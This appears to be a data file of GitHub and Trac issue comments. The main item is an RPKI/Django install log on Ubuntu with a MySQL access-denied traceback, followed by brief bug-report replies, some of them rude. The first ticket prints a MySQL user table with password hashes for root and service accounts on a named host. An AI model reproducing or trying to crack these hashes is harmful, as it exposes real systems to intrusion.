(5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package libaprutil1-dbd-sqlite3i386. Preparing to unpack .../libaprutil1-dbd-sqlite3_1.5.3-1_i386.deb ... Unpacking libaprutil1-dbd-sqlite3i386 (1.5.3-1) ... Selecting previously unselected package libaprutil1-ldapi386. Preparing to unpack .../libaprutil1-ldap_1.5.3-1_i386.deb ... Unpacking libaprutil1-ldapi386 (1.5.3-1) ... Selecting previously unselected package apache2-bin. Preparing to unpack .../apache2-bin_2.4.7-1ubuntu4.5_i386.deb ... Unpacking apache2-bin (2.4.7-1ubuntu4.5) ... Selecting previously unselected package apache2-data. Preparing to unpack .../apache2-data_2.4.7-1ubuntu4.5_all.deb ... Unpacking apache2-data (2.4.7-1ubuntu4.5) ... Selecting previously unselected package apache2. Preparing to unpack .../apache2_2.4.7-1ubuntu4.5_i386.deb ... Unpacking apache2 (2.4.7-1ubuntu4.5) ... Selecting previously unselected package libapache2-mod-wsgi. Preparing to unpack .../libapache2-mod-wsgi_3.4-4ubuntu2.1.14.04.2_i386.deb ... Unpacking libapache2-mod-wsgi (3.4-4ubuntu2.1.14.04.2) ... Selecting previously unselected package libfile-copy-recursive-perl. Preparing to unpack .../libfile-copy-recursive-perl_0.38-1_all.deb ... Unpacking libfile-copy-recursive-perl (0.38-1) ... Selecting previously unselected package librrd4. Preparing to unpack .../librrd4_1.4.7-2ubuntu5_i386.deb ... Unpacking librrd4 (1.4.7-2ubuntu5) ... Selecting previously unselected package libxml2-utils. Preparing to unpack .../libxml2-utils_2.9.1+dfsg1-3ubuntu4.4_i386.deb ... Unpacking libxml2-utils (2.9.1+dfsg1-3ubuntu4.4) ... Selecting previously unselected package mysql-client. Preparing to unpack .../mysql-client_5.5.44-0ubuntu0.14.04.1_all.deb ... Unpacking mysql-client (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-server. Preparing to unpack .../mysql-server_5.5.44-0ubuntu0.14.04.1_all.deb ... Unpacking mysql-server (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package python-dateutil. Preparing to unpack .../python-dateutil_1.5+dfsg-1ubuntu1_all.deb ... Unpacking python-dateutil (1.5+dfsg-1ubuntu1) ... Selecting previously unselected package python-django. Preparing to unpack .../python-django_1.6.1-2ubuntu0.9_all.deb ... Unpacking python-django (1.6.1-2ubuntu0.9) ... Selecting previously unselected package python-django-south. Preparing to unpack .../python-django-south_1.0-0.1_all.deb ... Unpacking python-django-south (1.0-0.1) ... Selecting previously unselected package python-lxml. Preparing to unpack .../python-lxml_3.3.3-1ubuntu0.1_i386.deb ... Unpacking python-lxml (3.3.3-1ubuntu0.1) ... Selecting previously unselected package python-mysqldb. Preparing to unpack .../python-mysqldb_1.2.3-2ubuntu1_i386.deb ... Unpacking python-mysqldb (1.2.3-2ubuntu1) ... Selecting previously unselected package python-netifaces. Preparing to unpack .../python-netifaces_0.8-3build1_i386.deb ... Unpacking python-netifaces (0.8-3build1) ... Selecting previously unselected package python-vobject. Preparing to unpack .../python-vobject_0.8.1c-4ubuntu1_all.deb ... Unpacking python-vobject (0.8.1c-4ubuntu1) ... Selecting previously unselected package python-yaml. Preparing to unpack .../python-yaml_3.10-4ubuntu0.1_i386.deb ... Unpacking python-yaml (3.10-4ubuntu0.1) ... Selecting previously unselected package ssl-cert. Preparing to unpack .../ssl-cert_1.0.33_all.deb ... Unpacking ssl-cert (1.0.33) ... Selecting previously unselected package update-inetd. Preparing to unpack .../update-inetd_4.43_all.deb ... Unpacking update-inetd (4.43) ... Selecting previously unselected package xsltproc. Preparing to unpack .../xsltproc_1.1.28-2build1_i386.deb ... Unpacking xsltproc (1.1.28-2build1) ... Selecting previously unselected package rrdtool. Preparing to unpack .../rrdtool_1.4.7-2ubuntu5_i386.deb ... Unpacking rrdtool (1.4.7-2ubuntu5) ... Selecting previously unselected package xinetd. Preparing to unpack .../xinetd_1%3a2.3.15-3ubuntu1_i386.deb ... Unpacking xinetd (12.3.15-3ubuntu1) ... Selecting previously unselected package rpki-rp. Preparing to unpack .../rpki-rp_0.6088~trusty_i386.deb ... Unpacking rpki-rp (0.6088~trusty) ... Selecting previously unselected package rpki-ca. Preparing to unpack .../rpki-ca_0.6088~trusty_i386.deb ... Unpacking rpki-ca (0.6088~trusty) ... Processing triggers for man-db (2.6.7.1-1ubuntu1) ... Processing triggers for ureadahead (0.100.0-16) ... ureadahead will be reprofiled on next reboot Processing triggers for ufw (0.34~rc-0ubuntu2) ... Setting up libaio1i386 (0.3.109-4) ... Setting up libapr1i386 (1.5.0-1) ... Setting up libaprutil1i386 (1.5.3-1) ... Setting up fonts-dejavu-core (2.34-1ubuntu1) ... Setting up fontconfig-config (2.11.0-0ubuntu4.1) ... Setting up libfontconfig1i386 (2.11.0-0ubuntu4.1) ... Setting up libpixman-1-0i386 (0.30.2-2ubuntu1) ... Setting up libxcb-render0i386 (1.10-2ubuntu1) ... Setting up libxcb-shm0i386 (1.10-2ubuntu1) ... Setting up libxrender1i386 (10.9.8-1build0.14.04.1) ... Setting up libcairo2i386 (1.13.0~20140204-0ubuntu1.1) ... Setting up libdatrie1i386 (0.2.8-1) ... Setting up libgraphite2-3i386 (1.2.4-1ubuntu1) ... Setting up libharfbuzz0bi386 (0.9.27-1ubuntu1) ... Setting up libthai-data (0.1.20-3) ... Setting up libthai0i386 (0.1.20-3) ... Setting up fontconfig (2.11.0-0ubuntu4.1) ... Regenerating fonts cache... done. Setting up libpango-1.0-0i386 (1.36.3-1ubuntu1.1) ... Setting up libpangoft2-1.0-0i386 (1.36.3-1ubuntu1.1) ... Setting up libpangocairo-1.0-0i386 (1.36.3-1ubuntu1.1) ... Setting up libxslt1.1i386 (1.1.28-2build1) ... Setting up libyaml-0-2i386 (0.1.4-3ubuntu3.1) ... Setting up libdbi-perl (1.630-1) ... Setting up libdbd-mysql-perl (4.025-1) ... Setting up libterm-readkey-perl (2.31-1) ... Setting up mysql-client-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Setting up mysql-client-5.5 (5.5.44-0ubuntu0.14.04.1) ... Setting up mysql-server-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Setting up mysql-server-5.5 (5.5.44-0ubuntu0.14.04.1) ... 150806  54218 [Warning] Using unique option prefix key_buffer instead of key_buffer_size is deprecated and will be removed in a future release. Please use the full name instead. 150806  54218 [Note] /usr/sbin/mysqld (mysqld 5.5.44-0ubuntu0.14.04.1) starting as process 3444 ... mysql start/running, process 3576 Setting up libaprutil1-dbd-sqlite3i386 (1.5.3-1) ... Setting up libaprutil1-ldapi386 (1.5.3-1) ... Setting up apache2-bin (2.4.7-1ubuntu4.5) ... Setting up apache2-data (2.4.7-1ubuntu4.5) ... Setting up apache2 (2.4.7-1ubuntu4.5) ... Enabling module mpm_event. Enabling module authz_core. Enabling module authz_host. Enabling module authn_core. Enabling module auth_basic. Enabling module access_compat. Enabling module authn_file. Enabling module authz_user. Enabling module alias. Enabling module dir. Enabling module autoindex. Enabling module env. Enabling module mime. Enabling module negotiation. Enabling module setenvif. Enabling module filter. Enabling module deflate. Enabling module status. Enabling conf charset. Enabling conf localized-error-pages. Enabling conf other-vhosts-access-log. Enabling conf security. Enabling conf serve-cgi-bin. Enabling site 000-default.  Starting web server apache2                                                   *  Setting up libapache2-mod-wsgi (3.4-4ubuntu2.1.14.04.2) ... apache2_invoke Enable module wsgi Restarting web server apache2                                         [ OK ]  Setting up libfile-copy-recursive-perl (0.38-1) ... Setting up librrd4 (1.4.7-2ubuntu5) ... Setting up libxml2-utils (2.9.1+dfsg1-3ubuntu4.4) ... Setting up mysql-client (5.5.44-0ubuntu0.14.04.1) ... Setting up python-dateutil (1.5+dfsg-1ubuntu1) ... Setting up python-django (1.6.1-2ubuntu0.9) ... Setting up python-django-south (1.0-0.1) ... Setting up python-lxml (3.3.3-1ubuntu0.1) ... Setting up python-mysqldb (1.2.3-2ubuntu1) ... Setting up python-netifaces (0.8-3build1) ... Setting up python-vobject (0.8.1c-4ubuntu1) ... Setting up python-yaml (3.10-4ubuntu0.1) ... Setting up ssl-cert (1.0.33) ... Setting up update-inetd (4.43) ... Setting up xsltproc (1.1.28-2build1) ... Setting up rrdtool (1.4.7-2ubuntu5) ... Setting up xinetd (12.3.15-3ubuntu1) ... xinetd start/running, process 4472 Processing triggers for ureadahead (0.100.0-16) ... Setting up mysql-server (5.5.44-0ubuntu0.14.04.1) ... Processing triggers for ufw (0.34~rc-0ubuntu2) ... Setting up rpki-rp (0.6088~trusty) ... Setting up rpki-ca (0.6088~trusty) ... RPKI Apache configuration platform ""Ubuntu"", action ""install"" Writing /etc/rpki/apache.conf.sample Would have removed /etc/rpki/apache.conf if it existed Writing /etc/rpki/apache.conf Would have removed /etc/apache2/sites-available/rpki.conf if it existed Symlinking /etc/apache2/sites-available/rpki.conf to /etc/rpki/apache.conf Would have removed /etc/rpki/apache.cer if it existed Would have removed /etc/rpki/apache.key if it existed Running a2enmod ssl Considering dependency setenvif for ssl Module setenvif already enabled Considering dependency mime for ssl Module mime already enabled Considering dependency socache_shmcb for ssl Enabling module socache_shmcb. Enabling module ssl. See /usr/share/doc/apache2/README.Debian.gz on how to configure SSL and create self-signed certificates. To activate the new configuration, you need to run service apache2 restart Running a2ensite rpki Enabling site rpki. To activate the new configuration, you need to run service apache2 reload Running a2dismod deflate Module deflate disabled. To activate the new configuration, you need to run service apache2 restart Running service apache2 restart Restarting web server apache2                                                AH00548 NameVirtualHost has no effect and will be removed in the next release /etc/apache2/sites-enabled/rpki.conf5                                                                  [ OK ]  # Current version of rpkid is 0.6088 Writing /usr/share/rpki/ca.cer Writing /usr/share/rpki/rpkid.key Writing /usr/share/rpki/rpkid.cer Writing /usr/share/rpki/irdbd.cer Writing /usr/share/rpki/irbe.cer Writing /usr/share/rpki/pubd.key Writing /usr/share/rpki/pubd.cer Syncing... Creating tables ... Creating table auth_permission Creating table auth_group_permissions Creating table auth_group Creating table auth_user_groups Creating table auth_user_user_permissions Creating table auth_user Creating table django_content_type Creating table django_session Creating table cacheview_addressrange Creating table cacheview_addressrangev6 Creating table cacheview_asrange Creating table cacheview_validationlabel Creating table cacheview_repositoryobject Creating table cacheview_validationstatus Creating table cacheview_signedobject Creating table cacheview_cert_addresses Creating table cacheview_cert_asns Creating table cacheview_cert_addresses_v6 Creating table cacheview_cert Creating table cacheview_roaprefixv4 Creating table cacheview_roaprefixv6 Creating table cacheview_roa_prefixes_v6 Creating table cacheview_roa_prefixes Creating table cacheview_roa Creating table cacheview_ghostbuster Creating table routeview_routeorigin Creating table routeview_routeoriginv6 Creating table south_migrationhistory Installing custom SQL ... Installing indexes ... Installed 0 object(s) from 0 fixture(s)  Synced django.contrib.auth django.contrib.contenttypes django.contrib.sessions django.contrib.staticfiles rpki.irdb rpki.gui.cacheview rpki.gui.routeview south }}}  gui does put up the login page, see  to create superuser {{{ rpki.dfw.rg.net/root# rpki-manage createsuperuser Traceback (most recent call last)   File ""/usr/sbin/rpki-manage"", line 13, in &lt;module&gt;     execute_from_command_line()   File ""/usr/lib/python2.7/dist-packages/django/core/management/init.py"", line 399, in execute_from_command_line     utility.execute()   File ""/usr/lib/python2.7/dist-packages/django/core/management/init.py"", line 392, in execute     self.fetch_command(subcommand).run_from_argv(self.argv)   File ""/usr/lib/python2.7/dist-packages/django/core/management/base.py"", line 242, in run_from_argv     self.execute(args, **options.dict)   File ""/usr/lib/python2.7/dist-packages/django/core/management/base.py"", line 285, in execute     output = self.handle(args, options)   File ""/usr/lib/python2.7/dist-packages/django/contrib/auth/management/commands/createsuperuser.py"", line 80, in handle     default_username = get_default_username()   File ""/usr/lib/python2.7/dist-packages/django/contrib/auth/management/init.py"", line 183, in get_default_username     auth_app.User._default_manager.get(username=default_username)   File ""/usr/lib/python2.7/dist-packages/django/db/models/manager.py"", line 151, in get     return self.get_queryset().get(*args, kwargs)   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 301, in get     num = len(clone)   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 77, in len     self._fetch_all()   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 854, in _fetch_all     self._result_cache = list(self.iterator())   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 220, in iterator     for row in compiler.results_iter()   File ""/usr/lib/python2.7/dist-packages/django/db/models/sql/compiler.py"", line 710, in results_iter     for rows in self.execute_sql(MULTI)   File ""/usr/lib/python2.7/dist-packages/django/db/models/sql/compiler.py"", line 780, in execute_sql     cursor = self.connection.cursor()   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 159, in cursor     cursor = util.CursorWrapper(self._cursor(), self)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 129, in _cursor     self.ensure_connection()   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 124, in ensure_connection     self.connect()   File ""/usr/lib/python2.7/dist-packages/django/db/utils.py"", line 99, in exit     six.reraise(dj_exc_type, dj_exc_value, traceback)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 124, in ensure_connection     self.connect()   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 112, in connect     self.connection = self.get_new_connection(conn_params)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/mysql/base.py"", line 435, in get_new_connection     conn = Database.connect(conn_params)   File ""/usr/lib/python2.7/dist-packages/MySQLdb/init.py"", line 81, in Connect     return Connection(*args, kwargs)   File ""/usr/lib/python2.7/dist-packages/MySQLdb/connections.py"", line 187, in init     super(Connection, self).init(*args, **kwargs2) django.db.utils.OperationalError (1045, ""Access denied for user 'rpki'@'localhost' (using password YES)"") }}} user rpki seems to have insufficuent privs or something should be pushing a password. {{{ +-----------------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+ | Host            | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string | +-----------------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+ | localhost       | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | rpki.dfw.rg.net | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | 127.0.0.1       | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | 1             | root             | 27B023C663711A7F5BA1028DF154535BB755CE96 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | | localhost       | debian-sys-maint | FE1A7AC5CD77B01C9499DC908A03D4AACDC4C198 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  | | localhost       | rpki             | 1583AFC7E20152C8A350357DD835DDEF7A428690 | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  | +-----------------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+ }}} and the documentation sucks caterpillar snot! Trac ticket #767 component build priority major, owner sra, created by randy on 2015-08-06T065233Z, last modified 2016-08-05T162059Z ",False,True
forum/standardnotes/39/441314954,forum/standardnotes/39,On the roadmap for 2019 ) ,False,True
eiffel-remrem-semantics/Ericsson/37/203070603,eiffel-remrem-semantics/Ericsson/37,"Implemented build step functionality  Eiffel json schema's cloned from github eiffel repo, topic-drop4 branch. Eiffel Schema Changes  for jsonSchema2pojo generation plugin ### Added required properties JavaType ExtendedJavaType    Modified eiffel shcema's 1. Changed time format 2. Removed 's' from class names ending with that letter  ",False,True
officer/davidgohel/141/400993855,officer/davidgohel/141,that is what I get final.docx You never provided what you get nor describe the error nor answer my questions. ,False,True
Osmand/osmandapp/3663/407553984,Osmand/osmandapp/3663,"IMHO,  it is often a case-by-case decision and sometimes hard to get 'right' by just looking at the map data. What we do is err on the safe side snd rather play the prompt too often than too seldom. I believe it works well in many areas, but I can well imagine there are issues in rather montaineous areas or other regions with curvy highway sections and associated crossings. Not currently sure how to implement an overall improvement, although most certainly not impossible. ",False,True
nixpkgs/NixOS/32080/349827464,nixpkgs/NixOS/32080,"For what it is worth, williammpratt's attitude here is not representative of the NixOS community's attitude toward other software. The user has since been blocked from the NixOS organization. ",False,True
ansible/ansible/13262/202399118,ansible/ansible/13262,"It's wierd, but the YAML validator I use formats it that way, works like a charm. Here's the entire playbook ",False,True
find-and-replace/atom/322/201803335,find-and-replace/atom/322,"Those shortcut keys work. They weren't apparent to me though, I prefer to have a prev button. I'd like to see the previous button as an option in settings that I can switch on if you feel it shouldn't be visible by default. ",False,True
tern-lint/angelozerr/39/104669090,tern-lint/angelozerr/39,"@friend, thanks for the additional information (and confirmation about typing in marijnh/tern). I just wanted to make sure that the issue was reported. I think I can workaround most of this for now by removing the DI Arrays from my source code and add a build step to put them back before minification / mangling. ",False,True
opensource-socialnetwork/opensource-socialnetwork/1365/373467241,opensource-socialnetwork/opensource-socialnetwork/1365,"You don't have permission to access /installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation/ on this server. Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request. Have as well message my hosting company and they told me the issue is with the script ",False,True
termux-packages/termux/2735/412909986,termux-packages/termux/2735,@friend The source of error is  ,False,True
ARKStatsExtractor/cadon/850/390246869,ARKStatsExtractor/cadon/850,"Can anyone explain to me why this Tek Rex is importing wrong, all the values are correct, but the wild level should be 360 and not 432.  ",False,True
WarBugs/WarEmu/13182/456688522,WarBugs/WarEmu/13182,,False,True
code-d/Pure-D/29/182587964,code-d/Pure-D/29,Not sure if it happens because osx rejects something there. Can you clone this repository and try debugging the extension? Simply click debug and start at the right. Error paths should be better then ,False,True
hyperbox/hyperbox/10/253419436,hyperbox/hyperbox/10,"So I'm just working with my test right now. I've just create a vm with virtualbox GUI with 3D acceleration, right now I'm just installing windows right now. But anyway if the 3D acceleration wasn't working, it wouldn't start it at all since I think the verification of the possibility of 3D acceleration is made before launching the VM right? ",False,True
leveldb/google/519/339737680,leveldb/google/519,"Also Yay, a million times, yay! We'll pull it into Mesos with . ",False,True
core/owncloud/27775/301100108,core/owncloud/27775,"@friend I can confirm that it does now, so I guess this issue is solved. However, it used to suggest the upgrade to 10.0 for , then fail with a 404; this was definitely an issue for multiple people (see ",False,True
bootstrap/twbs/3057/5140599,bootstrap/twbs/3057,"@friend If you want to talk about ""sandwiches"" and how it relates, it'd be like giving away a free one (great!) and when they ask for a napkin you respond with ""well, I know how not to spill it on myself, maybe you should learn to not make a mess on yourself too."" ",False,True
bootstrap/twbs/9501/32695742,bootstrap/twbs/9501,"""Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software."" I think the above license allows the creation of other bootstrap forks, interesting... correct me if I am wrong. ",False,True
AKS/Azure/132/434183293,AKS/Azure/132,@friend is multi-agent pools supported in AKS ? ,False,True
SevTech-Ages/DarkPacks/2977/401630430,SevTech-Ages/DarkPacks/2977,"JEI has literally EVERY RECIPE in the pack.... so whats the problem?   It's even setup in a manner where, if it's not in JEI, you can't make it.... yet. No one said Discord was required. I offended you? Working as intended.  Your OP is offensive given that you paid exactly nothing for SevTech but have the gall to stand up on a soap box and complain about, how a group of hobbyists did not make this pack for the general population.  As you have repeated pointed out, the pack was made for Sevadus.  Since you haven't paid money for the pack,  they are under no obligation to do anything.  Yet your attitude is that of someone that paid money for a product and is expecting a much higher tier of support.   This make you and entitled jerk. I have perused all of your tickets... honestly most of them are just a difference of opinion, and you, in this post come off as your opinion should have more weight than it really does.   The remainder are issues with the behavior of a specific mod which would need to be taken up with the mod author, not the pack author.   Based on some of the responses... you need to learn how to use the search/filter button. This issue tracker is for things not working as the AUTHOR intended, not how you think it should be, nor how you would have done it. You also mention that you're playing as part of a group... why are you not using the group mechanics? This pack has a theme, a structure that was intended from the outset.  Your opinion on implementation does not matter in the slightest.  You were not the intended audience. ",False,True
vuejs.org/vuejs/974/369062634,vuejs.org/vuejs/974,"There are no way to ignore WCAG 2.0 recommendations if they are required. A site is either accessible or not. In order to be accessible it must satisfy all criteria. user-agent normally look at the content after running java-script, but if HTML is not valid it increases risk of not passing an accessibility audit. ",False,True
Elgg/Elgg/12126/410004923,Elgg/Elgg/12126,Try adding  to  and see what's in the logs. ,False,True
bootstrap/twbs/10133/23342358,bootstrap/twbs/10133,"@friend Hey, @friend is just doing what needs doing—there is no need to curse at him for cross linking and trying to de-dupe issues. There's no need to be upset—that attitude doesn't belong here, not to us as maintainers or anyone else for that matter. And as another note, there's basically no way around this that I've found (yet?). I've spent a solid amount of time on it and haven't gotten anywhere—it really seems like a browser bug, as I mentioned in #9774. ",False,True
SpongeForge/SpongePowered/2339/407175915,SpongeForge/SpongePowered/2339,Sponge testing discord needs to be completely streamlined for testing and not setup as personal support for latest builds. ,False,True
courseplay/Courseplay/3234/463912310,courseplay/Courseplay/3234,I think he mentioned #3142 doing this in this way is a pure disgrace ... ,False,True
expo/expo/3030/451562923,expo/expo/3030,@friend some reading while you wait ) ,False,True
A3-Antistasi/A3Antistasi/57/394801641,A3-Antistasi/A3Antistasi/57,Arsenal restrictions for non-members allow/forbid taking non-unlocked weapons. In case people want to have membership without these weapon restrictions. ,False,True
esx_policejob/ESX-Org/104/398835905,esx_policejob/ESX-Org/104,"This is not an issue with the script. Ask for help somewhere else, e.g the ESX discord. ",False,True
ansible/ansible/14050/457615357,ansible/ansible/14050,Disabling warnings ,False,True
cordova-plugin-purchase/j3k0/744/432634191,cordova-plugin-purchase/j3k0/744,"Hi, If you needed more details then you could have just said it. Im sorry for the missing information. The application has been approved by apple and also the product. I tried as much as I could before asking for help here Thanks for the consideration ",False,True
rdpwrap/stascorp/645/457027476,rdpwrap/stascorp/645,"Thanks for this fix, i added the snips ad instructed to the ini file and everything lit up!  ",False,True
dev/nethesis/5435/404788756,dev/nethesis/5435,in   nethcti-server3-3.1.0-1.5.gdf48f0f.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.5.gdf48f0f.ns7.x86_64.rpm  ,False,True
bootstrap/twbs/3057/5140311,bootstrap/twbs/3057,@friend Object f has no method 'forEach' undefined is not a function number is not a function will compress wrong ,False,True
prideR/PRIDE-R/13/65932685,prideR/PRIDE-R/13,"Since this package includes just the core functionality provided by the PRIDE Archive web service, that additional functionality will be created in a separate package (e.g. ",False,True
rails/rails/33677/415077239,rails/rails/33677,"They should stop selling black or white cars. We weren't serious, right? ",False,True
vuejs.org/vuejs/974/369058277,vuejs.org/vuejs/974,@friend which WCAG conformance rule relies on HTML validation? ,False,True
cordova-plugin-purchase/j3k0/744/432518365,cordova-plugin-purchase/j3k0/744,"@friend We don't work for you, so if you like us to give you support for free, on our free time, you'd better not talk this way. That's not how you'll get help. There's a F.A.Q. on the wiki with this checklist.  Have you enabled In-App Purchases for your App ID? Do you have a iTunes Paid Application contract in effect? Have you checked Cleared for Sale for your product? Are there any contracts waiting for approval? In-App Purchases have all fields filled (including screenshots)? Did you wait 24 hours? Using a real device (not a simulator)? Are you using the full product ID in register? Are there any error in your product ID? Do you wait cordova's ""deviceready"" event before loading the purchases? Have you submitted (and optionally rejected) your application binary? Does your project’s .plist Bundle ID match your App ID? Have you generated and installed a new provisioning profile for the new App ID? Have you configured your project to code sign using this new provisioning profile? Are your bank details active on iTunes Connect? Have you tried deleting the app from your device and reinstalling? Is your device jailbroken? If so, you need to revert the jailbreak for IAP to work.  Did you went over it? ",False,True
Sabaki/SabakiHQ/341/368614761,Sabaki/SabakiHQ/341,"It's hardly constructive criticism, since you didn't say what exactly can be changed. Also I don't know the book and am hardly willing to read it just for you. Furthermore, I didn't study Human-Computer Interaction. Let's not argue about formal definitions. My argument still stands if you change one wording for another. I did indeed miss this, but please do explain yourself further. That's exactly the button I'm referring to. No contradictions here. And I think WGo can be customized either way. I'm not a fan of how opening an SGF file can change a user's setting. Also, if the score has already been calculated, there is no need to calculate it again with the scoring tool. This is actually a good idea. ",False,True
bootstrap/twbs/3057/5144910,bootstrap/twbs/3057,@friend sorry... Best practices === Cleanest Code &lt;/trolling&gt; ,False,True
zfs/zfsonlinux/7401/379558073,zfs/zfsonlinux/7401,"@friend @friend any clue on why it affect 3.x kernels only, while 4.x seems immune? ",False,True
code-d/Pure-D/29/132747012,code-d/Pure-D/29,"i think i might have missed something while setting up but i cannot seem to get completion to work &lt;img width=""1226"" alt=""screen shot 2016-02-10 at 17 19 35"" src="" of the log seems as if everything is setup correctly though ",False,True
PokemonGo-Web/PokemonGoF/118/319224403,PokemonGo-Web/PokemonGoF/118,"Old issue, multiple accounts are working fine in bot. ",False,True
Aether-Legacy/Modding-Legacy/341/458388192,Aether-Legacy/Modding-Legacy/341,"They despawn when out of range of the player, or when they get stuck. This is not an issue. ",False,True
ansible/ansible/13262/330505378,ansible/ansible/13262,plus one This feature will be very much helpful. ,False,True
lxqt/lxqt/1628/441282467,lxqt/lxqt/1628,"yeah - the last and the upcoming release are the ""bad"" releases for maintainers sunglasses 0.13.0 with the  common and config moves, 0.14.0 with the language package moves. Both things remove(d) many dead corpses that was hidden in our basement. I want to stay with the configs in /usr/share too - the ability to handle things like   without patching is a really great. ",False,True
rdpwrap/stascorp/645/457955889,rdpwrap/stascorp/645,Same as above happened to me. Fixed on restart. ,False,True
bootstrap/twbs/10133/23224343,bootstrap/twbs/10133,Duplicate of #9774. Please search next time. ,False,True
